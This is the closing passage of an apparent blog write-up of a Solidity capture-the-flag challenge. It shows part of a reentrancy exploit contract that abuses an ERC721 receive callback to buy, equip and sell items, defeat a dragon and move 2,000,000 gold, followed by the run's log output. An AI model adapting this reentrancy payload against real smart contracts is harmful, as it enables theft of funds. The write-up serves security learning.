</span></span><span class=line><span class=cl>            <span class=n>B</span><span class=p>.</span><span class=n>bankNoteValues</span><span class=p>(</span><span class=mi>2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=n>B</span><span class=p>.</span><span class=n>withdraw</span><span class=p>(</span><span class=mi>2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=n>G</span><span class=p>.</span><span class=n>approve</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=n>Sh</span><span class=p>),</span> <span class=nb>type</span><span class=p>(</span><span class=nc>uint256</span><span class=p>).</span><span class=nb>max</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=n>Sh</span><span class=p>.</span><span class=n>buyItem</span><span class=p>(</span><span class=mi>4</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=n>Sh</span><span class=p>.</span><span class=n>buyItem</span><span class=p>(</span><span class=mi>3</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=n>I</span><span class=p>.</span><span class=n>safeTransferFrom</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=nb>this</span><span class=p>),</span> <span class=kt>address</span><span class=p>(</span><span class=n>K</span><span class=p>),</span> <span class=mi>3</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=k>new</span> <span class=kt>bytes</span><span class=p>(</span><span class=mi>0</span><span class=p>));</span>
</span></span><span class=line><span class=cl>            <span class=n>I</span><span class=p>.</span><span class=n>safeTransferFrom</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=nb>this</span><span class=p>),</span> <span class=kt>address</span><span class=p>(</span><span class=n>K</span><span class=p>),</span> <span class=mi>4</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=k>new</span> <span class=kt>bytes</span><span class=p>(</span><span class=mi>0</span><span class=p>));</span>
</span></span><span class=line><span class=cl>            <span class=n>K</span><span class=p>.</span><span class=n>equipItem</span><span class=p>(</span><span class=mi>4</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=n>K</span><span class=p>.</span><span class=n>equipItem</span><span class=p>(</span><span class=mi>3</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=n>K</span><span class=p>.</span><span class=n>fightDragon</span><span class=p>();</span> <span class=c1>//Weird as fuck should one oneshot here
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=n>K</span><span class=p>.</span><span class=n>fightDragon</span><span class=p>();</span>
</span></span><span class=line><span class=cl>            <span class=n>K</span><span class=p>.</span><span class=n>sellItem</span><span class=p>(</span><span class=mi>3</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=n>K</span><span class=p>.</span><span class=n>sellItem</span><span class=p>(</span><span class=mi>4</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=n>emit</span> <span class=n>log_named_uint</span><span class=p>(</span>
</span></span><span class=line><span class=cl>                <span class=s>&#34;The number of gold piece&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=n>G</span><span class=p>.</span><span class=n>balanceOf</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=n>K</span><span class=p>))</span> <span class=o>/</span> <span class=mi>1</span> <span class=kc>ether</span>
</span></span><span class=line><span class=cl>            <span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=n>K</span><span class=p>.</span><span class=n>bankDeposit</span><span class=p>(</span><span class=mi>2</span><span class=n>_000_000</span> <span class=kc>ether</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=n>K</span><span class=p>.</span><span class=n>bankTransferPartial</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span> <span class=mi>2</span><span class=n>_000_000</span> <span class=kc>ether</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>emit</span> <span class=n>log_named_uint</span><span class=p>(</span><span class=s>&#34;Health of the Dragon&#34;</span><span class=p>,</span> <span class=n>D</span><span class=p>.</span><span class=n>health</span><span class=p>());</span>
</span></span><span class=line><span class=cl>            <span class=n>emit</span> <span class=n>log_named_uint</span><span class=p>(</span><span class=s>&#34;Health of the knight&#34;</span><span class=p>,</span> <span class=n>K</span><span class=p>.</span><span class=n>health</span><span class=p>());</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>increment</span><span class=o>++</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nb>this</span><span class=p>.</span><span class=n>onERC721Received</span><span class=p>.</span><span class=nb>selector</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>onERC1155Received</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=kt>address</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=kt>address</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=kt>uint256</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=kt>uint256</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=kt>bytes</span> <span class=n>calldata</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span> <span class=k>public</span> <span class=k>pure</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>bytes4</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nb>this</span><span class=p>.</span><span class=n>onERC1155Received</span><span class=p>.</span><span class=nb>selector</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Results of the payload:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>Script ran successfully.
</span></span><span class=line><span class=cl><span class=o>==</span> <span class=nv>Logs</span> <span class=o>==</span>
</span></span><span class=line><span class=cl>  The Knight address: 0x7aacc5300ec7ac58fe86645d08f21b1becadf99a
</span></span><span class=line><span class=cl>  Health of the knight: <span class=m>10</span>
</span></span><span class=line><span class=cl>  Health of the Dragon: <span class=m>1000000</span>
</span></span><span class=line><span class=cl>  The number of gold piece of BANK: <span class=m>0</span>
</span></span><span class=line><span class=cl>  The number of gold piece: <span class=m>10</span>
</span></span><span class=line><span class=cl>  The number of gold piece: <span class=m>2000010</span>
</span></span><span class=line><span class=cl>  Health of the Dragon: <span class=m>0</span>
</span></span><span class=line><span class=cl>  Health of the knight: <span class=m>10</span>
</span></span></code></pre></td></tr></table></div></div></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>Updated on 2023-03-12</span></div></div><div class=post-info-line><div class=post-info-md></div><div class=post-info-share><span></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw" aria-hidden=true></i>&nbsp;<a href=/tags/poc/>PoC</a>,&nbsp;<a href=/tags/evm/>EVM</a>,&nbsp;<a href=/tags/reeantrancy/>REEANTRANCY</a>,&nbsp;<a href=/tags/erc721/>ERC721</a>,&nbsp;<a href=/tags/flashloan/>FLASHLOAN</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>Back</a></span>&nbsp;|&nbsp;<span><a href=/>Home</a></span></section></div><div class=post-nav><a href=/posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/ class=prev rel=prev title="Challenge Twitter - EVM Puzzles & selfdestruct"><i class="fas fa-angle-left fa-fw" aria-hidden=true></i>Challenge Twitter - EVM Puzzles & selfdestruct</a>
<a href=/posts/mevsec-introduction/ class=next rel=next title="MevSec writeup Introduction">MevSec writeup Introduction<i class="fas fa-angle-right fa-fw" aria-hidden=true></i></a></div></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line>Powered by <a href=https://gohugo.io/ target=_blank rel="noopener noreffer" title="Hugo 0.119.0">Hugo</a> | Theme - <a href=https://github.com/dillonzq/LoveIt target=_blank rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden=true></i> LoveIt</a></div><div class=footer-line itemscope itemtype=http://schema.org/CreativeWork><i class="far fa-copyright fa-fw" aria-hidden=true></i><span itemprop=copyrightYear>2023</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/ target=_blank></a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title="Back to Top"><i class="fas fa-arrow-up fa-fw" aria-hidden=true></i>
</a><a href=# id=view-comments class=fixed-button title="View Comments"><i class="fas fa-comment fa-fw" aria-hidden=true></i></a></div><link rel=stylesheet href=/lib/lightgallery/css/lightgallery-bundle.min.css><script type=text/javascript src=/lib/autocomplete/autocomplete.min.js></script><script type=text/javascript src=/lib/lunr/lunr.min.js></script><script type=text/javascript src=/lib/lazysizes/lazysizes.min.js></script><script type=text/javascript src=/lib/lightgallery/lightgallery.min.js></script><script type=text/javascript src=/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js></script><script type=text/javascript src=/lib/lightgallery/plugins/zoom/lg-zoom.min.js></script><script type=text/javascript src=/lib/clipboard/clipboard.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"Copy to clipboard",maxShownLines:500},comment:{},lightgallery:!0,search:{highlightTag:"em",lunrIndexURL:"/index.json",maxResultLength:10,noResultsFound:"No results found",snippetLength:30,type:"lunr"}}</script><script type=text/javascript src=/js/theme.min.js></script></body></html>